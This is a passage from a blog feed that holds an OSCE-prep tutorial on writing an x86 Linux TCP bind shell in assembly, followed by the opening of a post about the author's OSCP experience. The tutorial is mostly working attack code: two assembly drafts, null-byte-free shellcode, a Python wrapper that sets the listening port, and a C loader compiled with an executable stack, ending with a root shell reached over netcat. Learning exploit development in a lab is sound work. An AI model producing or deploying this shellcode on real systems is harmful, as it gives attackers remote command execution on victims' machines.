&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Crawl3r</name></author><summary type="html">Introduction: During my prep for OSCE, my first goal was to learn to create a bind shell in x86, written from scratch. As we know, or may not know, a bind shell does what it says in the name. It binds a shell. Unlike a reverse shell, the process sets up a listener on the host and waits for a connection, once accepted it fires off our new process and pipes the connection through allowing commands to be sent from a remote system and return the output. Brief thoughts: The actual implementation of the TCP bind shell was relatively straight forward. Using a C based prototype I was able to make a list of required system calls and utilise the Linux man pages to confirm the arguments and how they would need to appear and be set up within the asm file. An important thing to remember is null bytes are bad. We don’t want these to exist in our final project so simple tricks were used to get around these (i.e xor’ing registers with themselves to zero them). These will be highlighted when, and where, they are used. ## Initial planning: To begin with, I needed to know how a TCP bind shell would be implemented in C. As I had just been looking through h0mbre_’s github write ups, I remembered they included a simple one so I used this as my base reference. #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;strings.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; int main(void) { int listen_sock = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = INADDR_ANY; server_addr.sin_port = htons(9001); bind(listen_sock, (struct sockaddr *)&amp;amp;server_addr, sizeof(server_addr)); listen(listen_sock, 0); int conn_sock = accept(listen_sock, NULL, NULL); dup2(conn_sock, 0); dup2(conn_sock, 1); dup2(conn_sock, 2); execve(&quot;/bin/sh&quot;, NULL, NULL); } Once I had this, I was easily able to highlight the required system calls and start to gather the information I need to rebuild this is assembly. Utilising the Linux man pages and the Linux headers I crafted the following table which includes the syscall name, the C declaration (including parameters, types and return values) as well as the syscall number. This information may seem a little overkill right now, but it will become obvious when implementing the calls themselves later on in this write up. The following table lists the 6 system calls that are required to write our bind shell: System Call C Definition Return Value Syscall Number socket int socket(int domain, int type, int protocol); File descriptor for the new socket. 359 (0x167) bind int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); n/a 361 (0x169) listen int listen(int sockfd, int backlog); n/a 363 (0x16b) accept int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); File descriptor for the new socket. 364 (0x16c) dup2 int dup2(int oldfd, int newfd); n/a 63 (0x3f) execve int execve(const char *pathname, char *const argv[], char *const envp[]); n/a 11 (0xb) In order to create the above table, I used the following command with each syscall to obtain the C definition and return values from the linux manual pages: man 2 &amp;lt;function_name&amp;gt; As well as this, I used the following command to obtain the syscall value used within assembly to call the correct function: cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep &amp;lt;function_name&amp;gt; Crafting our shell (first draft): First things first, we want to create the skeleton of our script (first_bind_shell.asm): global _start section .text _start: ; zero out the common registers that we are likely to use xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx With close reference to the C script included above, we can begin crafting our system calls in their required order. Ensuring the registers are set up correctly relative to the required parameters. The first syscall required is the socket() call. This will create our TCP socket and return a value that we must keep track of, the file descriptor. As this is our first syscall, I will break down the function and the registers required in order to successfully call it. The function description is int socket(int domain, int type, int protocol); and as we can see, the function is used in the following manner in C int listen_sock = socket(AF_INET, SOCK_STREAM, 0); From this we can identify the required steps in assembly from a pseudo code perspective: Set the EAX register to hold the value of the syscall Set the EBX register to hold the value of our first parameter (AF_INET) Set the ECX register to hold the value of our second parameter (SOCK_STREAM) Set the EDX register to hold the value of our third parameter (0) Perform the syscall Store the return value held in the EAX register after the syscall Each one of these steps seems pretty simple to implement in assembly using ‘mov’ to place the correct values in the registers and ‘int 0x80’ to execute the syscall. The only information missing are the actual values for AF_INET and SOCK_STREAM, in C these are already defined with their integer values however, here we need the raw integer value. The easiest way to get these values would have been to ask my good friend Google. He seems pretty knowledgeable but instead I thought I might as well utilise the C types and dump their raw value. #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; int main(void){ printf(&quot;AF_INET: %d\n&quot;, AF_INET); printf(&quot;SOCK_STREAM: %d\n&quot;, SOCK_STREAM); return 0; } Compile and run: root@kali:~/Documents/bindshell/misc# gcc test.c root@kali:~/Documents/bindshell/misc# ./a.out AF_INET: 2 SOCK_STREAM: 1 Now we have all the required information, we can set up our target registers correctly and perform our first system call to socket. Looking back at our pseudo code above, we can translate it into the following x86 assembly: ; SOCKET SYSCALL ; set up the registers mov eax, 0x167 mov ebx, 0x2 mov ecx, 0x1 int 0x80 ; execute the syscall mov edi, eax ; store the return value in edi for future ref ; above pinched from h0mbre_ We set EAX to equal 0x167 (359), this is the value used later when the ‘int 0x80’ instruction is hit, which performs the actual syscall to socket. We now want to set up the EBX and ECX registers to hold the parameter values for our call. We set EBX to equal 0x2 (value of AF_INET), and ECX to 0x1 (value of SOCK_STREAM). We can now execute our system call. Registers before the call: gef➤ i r eax 0x167 0x167 ecx 0x1 0x1 edx 0x0 0x0 ebx 0x2 0x2 Registers after the call: gef➤ i r eax 0x3 0x3 ecx 0x1 0x1 edx 0x0 0x0 ebx 0x2 0x2 As we mentioned before. The return value for socket() is stored in the EAX. We can see above that this value is 0x3 (3). This is now our file descriptor and should be used throughout the program within some of the other system calls: bind() listen() accept() We can safely keep track of this value by storing it in a register we are unlikely going to use, preventing the value from being corrupted and overwritten. This is done by the final instruction ‘mov edi, eax’. Whilst writing this, I was following the execution in gdb - confirming the registers were working the way I wanted them too and the correct call was being made. Once confirmed, it was time to move on to the next syscall - bind(). Compared to the socket() system call, the bind() call requires quite a few more instructions to function correctly, including setting up the registers and pushing data onto the stack in the correct order, allowing us to obtain an address to use as a parameter. Looking at the C implementation of bind(), we can see 2 main sections of code include the creation of the ‘server_addr struct’ and the call to bind() itself. struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = INADDR_ANY; server_addr.sin_port = htons(9001); bind(listen_sock, (struct sockaddr *)&amp;amp;server_addr, sizeof(server_addr)); The first thing we want to do is make sure the EAX register holds the syscall number (361) ready for the execution, we can do this by placing 0x169 into the register. We then want to set our 1st parameter (EBX) to equal the file descriptor returned by the socket() function. Remember, this was stored in EDI. We now need our 2nd parameter (ECX) to point to a collection of data in memory that includes the AF_INET, INADDR_ANY and the target port number. To break this down further, we need to obtain our raw values for the following: AF_INET INADDR_ANY Port value (string) in hex The size of the structure itself Similar to before, I created a small C program to print these values to the screen: #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; int main(void){ struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_addr.s_addr = INADDR_ANY; server_addr.sin_port = htons(9001); printf(&quot;AF_INET: %d\n&quot;, server_addr.sin_family); printf(&quot;INADDR_ANY: %d\n&quot;, server_addr.sin_addr.s_addr); printf(&quot;SIZE OF: %d\n&quot;, sizeof(server_addr)); return 0; } Compiling and executing the script gave me the following information: root@kali:~/Documents/bindshell/misc# ./b.out AF_INET: 2 INADDR_ANY: 0 SIZE OF: 16 Now we know the AF_INET value, the INADDR_ANY value and the size of the completed struct - we can implement our own struct, push the data onto the stack correctly and obtain the address of this collection of data. The struct itself actually contains 4 different values, which can be seen in the below definition taken from https://www.cs.cmu.edu/~srini/15-441/S10/lectures/r01-sockets.pdf: struct sockaddr_in { short sin_family; // e.g. AF_INET ‏)3490(unsigned short sin_port; // e.g. htons struct in_addr sin_addr; // see struct in_addr, below char sin_zero[8]; // zero this if you want to }; So now we know that the data we need to structure within our assembly is the following: AF_INET (2) The port number (I used 9001 - 0x2329) The IP ddress (0.0.0.0 as we are locally binding) 0 The address of this data structure needs to be placed in the 2nd parameter (ECX), luckily the ESP currently points to this data. We need to remember that the port number is of type string, and therefore should be pushed onto the stack as a “word”. With the final addition of the size being placed into the 3rd parameter (EDX), the bind system call is ready to be executed. ; BIND syscall xor eax, eax ; zero out eax mov eax, 0x169 ; move 361 into syscall register mov ebx, edi ; move fd (edi val) into ebx - param 1 ; create our sockaddr struct in memory, used with bind() call, 2nd param xor ecx, ecx push ecx ; 0 push ecx ; Local Address (0.0.0.0) push word 0x2923 ; port number (9001) push word 0x2 ; AF_INET mov ecx, esp ; pointer to struct mov edx, 16 ; size of struct int 0x80 Now we are ready to implement our call to listen(). Looking at the C implementation above, listen(listen_sock, 0); we can see that we require our EBX register (1st parameter) to equal the value of our file descriptor returned from socket() and our ECX register (2nd parameter) should be equal to 0 before making our call to listen(). In addition to the parameter values, we want to make sure EAX holds the value to the correct system call (363) before calling ‘int 0x80’. This should all look like the following: ; LISTEN SYSCALL xor eax, eax mov eax, 0x16b mov ebx, edi xor ecx, ecx int 0x80 Next we want to implement our call to accept() which will appear very similar to the listen() call above. Looking at the C implementation, we see it’s usage as int conn_sock = accept(listen_sock, NULL, NULL);. Once again, we require EAX to equal our syscall value (364), we need our first parameter (EBX) to equal our file descriptor from our socket() call, we then need our 2nd (ECX) and 3rd (EDX) parameters to both equal 0. Finally, we execute our system call with ‘int 0x80’. ; ACCEPT SYSCALL xor eax, eax mov eax, 0x16c mov ebx, edi xor ecx, ecx xor edx, edx xor esi, esi int 0x80 Similar to socket(), the accept() call returns a file descriptor value to use within our final syscall, dup2(). We want to make sure we keep track of this value so we overwrite our previous file descriptor value stored in the EDI register. xor edi, edi mov edi, eax The next system call we need is dup2(). The following implementation was written to replicate the C code above, so there are 3 chunks of assembly that are pretty much the same except for one value. This could be cleaned up using a loop, but at this time, I just wanted the code to work. Looking at the C implementation, we see the following: dup2(conn_sock, 0); dup2(conn_sock, 1); dup2(conn_sock, 2); Looking at this, we need 3 separate calls to dup2() with 3 different values in the 2nd parameter (0, 1 and 2). For each call, we want to make sure our EAX value holds the value of our syscall (63), the 1st parameter requires the value of our file descriptor received from the accept() call above. The 2nd parameter is the value that needs to be set to 0, 1 and 2 across the 3 seperate calls. Finally, the ‘int 0x80’ is called to execute each system call. My approach at performing these three calls can be seen below: ; DUP2 SYSCALL xor eax, eax mov eax, 0x3f mov ebx, edi xor ecx, ecx int 0x80 xor eax, eax mov eax, 0x3f mov ebx, edi xor ecx, ecx mov ecx, 0x1 int 0x80 xor eax, eax mov eax, 0x3f mov ebx, edi xor ecx, ecx mov ecx, 0x2 int 0x80 By now, our process should have opened a socket, listened for a connection, accepted the incoming connection and set up our pipes into our process. We now want to implement our final system call, which actually gives this entire program any sense of purpose and use, the execve() call. This function allows us to execute our actual shell “/bin/sh”, giving us control over the target. Within the C implementation, the execve call is used like execve(“/bin/sh”, NULL, NULL);. Before implementing this in assembly, there is something we need to remember from the manual page and our table above. The manual shows the implementation and it’s parameters as: int execve(const char *pathname, char *const argv[], char *const envp[]); We can see that the 3 parameters all point to strings (pointers to chars/char arrays). Previously, we could simply set the value of the register to 0, however after attempting to do this for this system call I received errors during execution. After debugging the process for a little while, I tested pointing to nothing on the stack instead of simply setting the register to zero. That way, the register would be a pointer to a memory location, which held nothing. Sounds like a pointer to NULL to me! The final thing we need to have is the 1st parameter, which is actually the path to the file we would like to the execute. In this case, I used “/bin/sh”. This was achieved by getting the hex equivalent of this string, flipping it (Little Endian) and pushing it on the stack in 2 chunks. In step by steps, this what it looks like: “/bin/sh” in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 we flip these because it’s little endian we push the two chunks on separately 0x68732f6e, 0x69622f We then need the address of the string to be placed into the first parameter (EBX). Luckily, the string is at the top of the stack and there is a register that holds this address ready for use, ESP. We can set the value of EBX to the value of ESP and achieve this. This can be completed in x86 using the following instructions: push 0x68732f6e ; hs/n push 0x69622f2f ; ib// mov ebx, esp Now we need our 2nd (ECX) and 3rd (EDX) parameters to point to NULL values. As I stated above, I initially attempted to just 0 out the registers - however this did not work. So I ended up pushing a zero on to the stack and using the address held in ESP again to reference the top of the stack, which pointed at our zero value after the push. This was completed twice to satisfy both NULL parameters. Finally, I set the EAX register to the value 0xb (11), which is the value of the execve system call, and executed it with the ‘int 0x80’ instruction. xor eax, eax push eax push 0x68732f6e push 0x69622f2f mov ebx, esp push eax mov ecx, esp push eax mov edx, esp xor eax, eax mov eax, 0xb int 0x80 We should now have a fully functioning TCP bind shell, ready for assembling, linking and executing. When connecting to the bind shell, remember the port number specified in the structure created and used within the bind() system call. I created a quick little script to help with assembling and linking my scripts, rather than having to issue 2 separate commands each time: root@kali:~/Documents/bindshell/misc# cat build.sh echo &quot;Assembling $1.asm&quot; nasm -f elf32 &quot;$1&quot;.asm echo &quot;Linking $1.o&quot; ld -s -o &quot;$1&quot; &quot;$1&quot;.o echo &quot;Done&quot; Usage: ./build.sh tcp_bind_shell Upon assembling and linking the asm file, you should have a functional TCP bind shell. The entire first draft script can be seen here: global _start section .text _start: ; clear out the registers by xor-ing them with themselves. 0 without null bytes xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx ; SOCKET SYSCALL ; int socket(int domain, int type, int protocol); ; socket is the first syscall we want with syscall number is 359 (0x167) ; EAX = syscall number, ebx = param 1 (2), ecx = param 2 (1), edx = param 3 (0) ; return's our fd value to EAX, we want to keep this mov eax, 0x167 mov ebx, 0x2 mov ecx, 0x1 ; we don't do anything with edx as 0 already exists from the xor above int 0x80 ; this interrupt signal handles the syscall mov edi, eax ; store the return value in edi for future ref ; BIND syscall ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); xor eax, eax ; zero out eax mov eax, 0x169 ; move 361 into syscall register mov ebx, edi ; move fd (edi val) into ebx - param 1 ; create our sockaddr struct in memory, used with bind() call, 2nd param xor ecx, ecx ; zero out ecx push ecx ; push the 0 onto the stack (4th struct value) push ecx ; push the 0 onto the stack (IP Address) push word 0x2923 ; push the port onto stack (0x2329) (PORT NUM = 9001) push word 0x2 ; push 2 onto the stack (AF_INET) mov ecx, esp ; store the current stack pointer into ecx, points at struct mov edx, 16 ; this parameter takes the length of the addr (param 3) int 0x80 ; syscall ; LISTEN syscall 363 ; int listen(int sockfd, int backlog); xor eax, eax ; zero out eax mov eax, 0x16b ; move 363 into register (syscall number) mov ebx, edi ; this should still be return val from socket() -&amp;gt; fd xor ecx, ecx ; clean out ecx as the 2nd param value should be 0 int 0x80 ; syscall ; ACCEPT syscall 364 ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen); ; we want the return value from EAX (fd update) xor eax, eax ; zero out eax mov eax, 0x16c ; move 364 into register (syscall number) mov ebx, edi ; this should still be return val from socket() -&amp;gt; fd xor ecx, ecx ; zero out 2nd param (NULL) xor edx, edx ; zero out 3rd param (NULL) xor esi, esi ; fourth and final parameter is zero'd out int 0x80 ; syscall ; accept() returns a new fd value, so let's store this one off too xor edi, edi ; 0 out edi before backing up fd mov edi, eax ; back up the fd value in edi again ; DUP2 syscall (3 times) ; int dup2(int oldfd, int newfd); xor eax, eax ; zero out eax mov eax, 0x3f ; move 63 into register (syscall number) mov ebx, edi ; move fd into 1st param (from accept) xor ecx, ecx ; zero out 2nd param (0) int 0x80 ; syscall (1st) xor eax, eax ; zero out eax mov eax, 0x3f ; move 63 into register (syscall number) mov ebx, edi ; move fd into 1st param (from accept) xor ecx, ecx ; zero out 2nd param (0) mov ecx, 0x1 ; move 1 into 2nd param int 0x80 ; syscall (2nd) xor eax, eax ; zero out eax mov eax, 0x3f ; move 63 into register (syscall number) mov ebx, edi ; move fd into 1st param (from accept) xor ecx, ecx ; zero out 2nd param (0) mov ecx, 0x2 ; move 2 into 2nd param int 0x80 ; syscall (3rd) ; EXECVE() syscall ; int execve(const char *pathname, char *const argv[], char *const envp[]); ; NOTE, param 2 and 3 are pointers to strings. XOR, PUSH then point to STACK in register xor eax, eax ; zero out eax ready for pushing 0s on to the stack push eax ; push first zero on, align the stack? ; &quot;/bin/sh&quot; in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 ; we flip these because it's little endian ; 0x68732f6e, 0x69622f push 0x68732f6e push 0x69622f2f ; note the // at the end, sigsevs without - junk corrupting it? mov ebx, esp ; push the addr of our above string (esp) into 1st param push eax ; push 0 onto the stack (2nd param == NULL) mov ecx, esp ; requires a pointer - man page has them for usage push eax ; push 0 onto the stack (3rd param == NULL) mov edx, esp ; requires a pointer - man page has them for usage xor eax, eax ; zero out eax mov eax, 0xb ; move 11 into EAX register (syscall number) int 0x80 ; final syscall After dumping the hex from the executable, I noticed that there were a tonne of null bytes within the output - which is not good for our payload. In order to remove these, a second draft needs to be looked into and come up with a way to use the same instructions with no null bytes remaining. Second Draft: After playing around with the script for a while and testing a few things, I was able to tweak the script a little to remove some bloat and still successfully create a working TCP bind shell. The changes are relatively trivial, but it should help pull down the overall byte size of the payload (marginal), but ultimately it helped me learn some new tricks in x86 such as loops. The main changes I made to the assembly were: removed all xor instructions used to clear a register before moving a value into it after removing each of these, I realised that this led to issues when making the system calls. I used strace to attempt to see what was going on. Looking at the following output snippet, we can see that the registers must have had junk left over before using them for our call - resulting in garbage values. root@kali:~/Documents/bindshell/bindshellsecond_bind_shell# strace ./second_bind_shell execve(&quot;./second_bind_shell&quot;, [&quot;./second_bind_shell&quot;], 0xbfe76800 /* 41 vars */) = 0 socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3 bind(3, {sa_family=AF_INET, sin_port=htons(9001), sin_addr=inet_addr(&quot;1.0.0.0&quot;)}, 16) = -1 EADDRNOTAVAIL (Cannot assign requested address) syscall_0xffff016b(0x3, 0, 0x10, 0, 0x3, 0) = -1 ENOSYS (Function not implemented) syscall_0xffff016c(0x3, 0, 0, 0, 0x3, 0) = -1 ENOSYS (Function not implemented) syscall_0xffffff3f(0xffffffda, 0x2, 0, 0, 0xffffffda, 0) = -1 ENOSYS (Function not implemented) syscall_0xffffff3f(0xffffffda, 0x1, 0, 0, 0xffffffda, 0) = -1 ENOSYS (Function not implemented) syscall_0xffffff3f(0xffffffda, 0, 0, 0, 0xffffffda, 0) = -1 ENOSYS (Function not implemented) execve(&quot;//bin/sh&quot;, [], 0xbf992980 /* 0 vars */) = 0 For example, we can see that our hex value used for a system call (0x016c) exists, however the actual value it is attempting to call is 0xffff016b. This is because we only wrote to the lower half of the register using al, leaving anything already in the higher half of the register. After noticing this, I returned to XOR’ing most of the registers before moving values into them. Especially if I was targetting the lower half (al), to ensure the rest of the memory was zeroed. removed the 3 separate dup2 chunks and instead added a decrementing loop, using the value of the counter as the 2nd parameter value in ECX. Each iteration would decrement the ECX value down to 0 and check the current value before continuing the loop. If our value was not 0, we would jump back to the beginning of the loop and repeat our previous steps. If our value was 0, we have succesfully called dup2 three seperate times with the 2, 1 and 0 values in the 2nd parameter (ECX) and can safely exit the loop. when using a register to move values into them, use the lower half of the register only For example, EAX becomes AL or AX (depending on the size of the value), EBX becomes BL, and so on. Ultimately, this was done to prevent any NULL bytes (\x00) from existing in my final payload. The total source of our second bind shell attempt can be seen here: global _start section .text _start: xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx ; SOCKET SYSCALL ; socket is the first syscall we want with syscall number is 359 (0x167) ; EAX = syscall number, ebx = param 1 (2), ecx = param 2 (1), edx = param 3 (0) mov ax, 0x167 mov bl, 0x2 mov cl, 0x1 ; we don't do anything with edx as 0 already exists from the xor above int 0x80 ; this interrupt signal handles the syscall mov edi, eax ; store the return value in edi for future ref ; BIND syscall xor eax, eax mov ax, 0x169 ; move 361 into syscall register mov ebx, edi ; move fd (edi val) into ebx - param 1 ; create our sockaddr struct in memory, used with bind() call, 2nd param xor ecx, ecx push ecx ; push the 0 onto the stack (4th struct value) push ecx ; push the 0 onto the stack (Address) push word 0x2923 ; push the port onto stack (0x2329) (PORT NUM = 9001) push word 0x2 ; push 2 onto the stack (AF_INET) mov ecx, esp ; store the current stack pointer into ecx, points at struct xor edx, edx mov dl, 16 ; this parameter takes the length of the addr (param 3) int 0x80 ; syscall ; LISTEN syscall 363 xor eax, eax mov ax, 0x16b ; move 363 into register (syscall number) mov ebx, edi ; this should still be return val from socket() -&amp;gt; fd xor ecx, ecx ; clean out ecx as the 2nd param value should be 0 int 0x80 ; syscall ; ACCEPT syscall 364 xor eax, eax mov ax, 0x16c ; move 364 into register (syscall number) mov ebx, edi ; this should still be return val from socket() -&amp;gt; fd xor ecx, ecx ; zero out 2nd param (NULL) xor edx, edx ; zero out 3rd param (NULL) xor esi, esi int 0x80 ; syscall ; accept() returns a new fd value, so let's store this one off too mov edi, eax ; back up the fd value in edi again ; DUP2 syscall (3 times) xor ecx, ecx mov cl, 0x3 ; set counter register to 3 for counting down in the loop for_loop_dup2: xor eax, eax mov al, 0x3f mov ebx, edi dec cl ; decrement our counter before the syscall (should be 2, 1, 0) int 0x80 jnz for_loop_dup2 ; if ecx is not equal to 0, keep going ; EXECVE() syscall xor eax, eax ; zero out eax ready for pushing 0s on to the stack push eax ; push first zero on, align the stack? ; &quot;/bin/sh&quot; in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 ; we flip these because it's little endian ; 0x68732f6e, 0x69622f push 0x68732f6e push 0x69622f2f ; note the // at the end, sigsevs without - junk corrupting it? mov ebx, esp ; push the addr of our above string (esp) into 1st param push eax ; push 0 onto the stack (2nd param == NULL) mov ecx, esp ; requires a pointer - man page has them for usage push eax ; push 0 onto the stack (3rd param == NULL) mov edx, esp ; requires a pointer - man page has them for usage mov al, 0xb ; move 11 into EAX register (syscall number) int 0x80 ; final syscall Dumping the hex for usage: To extract our hex values for our shell, we can use the following shell script (dump_hex.sh) along with the target object to extract the hex values in a usable fashion. The output can be taken and placed directly into the following python wrapper. root@kali:~/Documents/bindshell/misc# cat dump_hex.sh objdump -d &quot;$1&quot; |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g' Usage: root@kali:~/Documents/bindshell/bindshellsecond_bind_shell# ../../misc/dump_hex.sh second_bind_shell &quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80&quot; As the above output shows, I have successfully tweaked my initial bind shell script to remove all null bytes during the second draft of the shell. The output also includes two 's because the actual value, allowing direct usage within a python string. We need the two back slash characters to ensure a single \ remains in the final output. Wrapper to allow custom port number: The issue with this shell at the moment, is the static port value used within the defined struct. In order to change the port number we currently need to either open the .asm file, tweak the hex number that is pushed onto the stack and rebuild the shell or remember which hex values in the entire hex string above reference the port. The more logical solution would be to create a little tool, or wrapper, that takes a user defined integer value, converts this value to hex and then replaces the current port number value before dumping the hex to the screen for use. The following script is a python wrapper that I have made to allow a custom port to be placed into the script, replacing the hard coded value within the final hex output. root@kali:~/Documents/bindshell# cat wrapper.py import sys import socket shellcode = (&quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01&quot; &quot;\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69&quot; &quot;\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68[p2][p1]\\x66\\x6a&quot; &quot;\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8&quot; &quot;\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c&quot; &quot;\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc7&quot; &quot;\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd&quot; &quot;\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f&quot; &quot;\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b&quot; &quot;\\xcd\\x80&quot; ) if len(sys.argv) != 2: print 'Usage: ' + sys.argv[0] + ' &amp;lt;port&amp;gt;' sys.exit() port = sys.argv[1] print &quot;Chosen port: %s&quot; % port int_port = int(port) if int_port &amp;gt; 65535: print &quot;Port choice is greater than max value (65535)&quot; sys.exit() htons_port_val = socket.htons(int_port) hex_port_value = hex(htons_port_val) cleaned_hex_port = hex_port_value.replace(&quot;0x&quot;, &quot;&quot;) first_port_val = &quot;\\x&quot; + cleaned_hex_port[:2] second_port_val = &quot;\\x&quot; + cleaned_hex_port[2:] print &quot;1st port: %s&quot; % first_port_val print &quot;2nd port: %s&quot; % second_port_val print &quot;&quot; print &quot;Ammending shellcode...&quot; shellcode = shellcode.replace(&quot;[p2]&quot;, second_port_val) shellcode = shellcode.replace(&quot;[p1]&quot;, first_port_val) print &quot;Final Shellcode:&quot; print shellcode As we can see in the above shellcode value, there are two placeholder values [p2] and [p1], these are the two hex values that are replaced with the target port, specified at runtime. Once edited, the final shellcode is output to the screen, as seen in the following usage example: root@kali:~/Documents/bindshell# python wrapper.py 9003 Chosen port: 9003 1st port: \x2b 2nd port: \x23 Ammending shellcode... Final Shellcode: \x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x23\x2b\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80 Our final step is to utilise this hex output within an executable that injects the shellcode directly into the process memory and executes it, binding out shell. This can be completed in various languages, for example C# is an ideal candidate for a Windows shell. As I am working within a Unix environment I wrote my executable in C. root@kali:~/Documents/bindshell# cat shell.c #include&amp;lt;stdio.h&amp;gt; #include&amp;lt;string.h&amp;gt; unsigned char code[] = &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x31\xc9\x51\x51\x66\x68\x23\x2b\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80&quot;; int main(void) { printf(&quot;Shellcode Length: %d\n&quot;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling and executing: root@kali:~/Documents/bindshell# gcc -fno-stack-protector -z execstack shell.c -o shell root@kali:~/Documents/bindshell# ./shell Shellcode Length: 118 root@kali:~# nc localhost 9003 id uid=0(root) gid=0(root) groups=0(root) pwd /root/Documents/bindshell</summary></entry><entry><title type="html">Before, During &amp;amp; After my OSCP</title><link href="http://localhost:4000/2019-03-03/before_during_after_oscp" rel="alternate" type="text/html" title="Before, During &amp; After my OSCP" /><published>2019-03-03T00:00:00+00:00</published><updated>2019-03-03T00:00:00+00:00</updated><id>http://localhost:4000/2019-03-03/before_during_after_oscp</id><content type="html" xml:base="http://localhost:4000/2019-03-03/before_during_after_oscp">&lt;p&gt;I passed my OSCP in June 2018, so this post is a little late. But honestly, I figured everyone else writes one almost immediately, fuelled by the joy/sadness of receiving the email from OffSec. I did think about writing one straight away but I didn’t really know how it would differ to anyone else… “I passed. Exam was hard. Labs was fun. Well worth it. Woooooh.”&lt;/p&gt;

&lt;p&gt;So a few months down the line, I figured I could post some points about my personal experience with OffSec’s PWK course (and ultimately, the very popular OSCP certification). I don’t really want to sit here and recommend resources and pre-requisites for everyone to be able to one shot the exam. These kind of blogs can be found with a simple Google, infact – some people even dump an entire A-Z on Github, so I’m sure if you’re good enough at Google then you’ll find it. However, that’d ruin the whole experience (in my opinion).&lt;/p&gt;

&lt;p&gt;The following sections of this post contain 3 main topics “Before”, “During” and “After” my time with OffSec, what I learnt and any recommendations I have regarding the entire course and exam. Again, to reiterate – this won’t be a “Do this box on Vulnhub and you’ll pass”, it’s more of a holistic view of everything around gaining your OSCP certification. As well as these 3 main sections, I will break down my course purchase and conclude with any final thoughts.&lt;/p&gt;

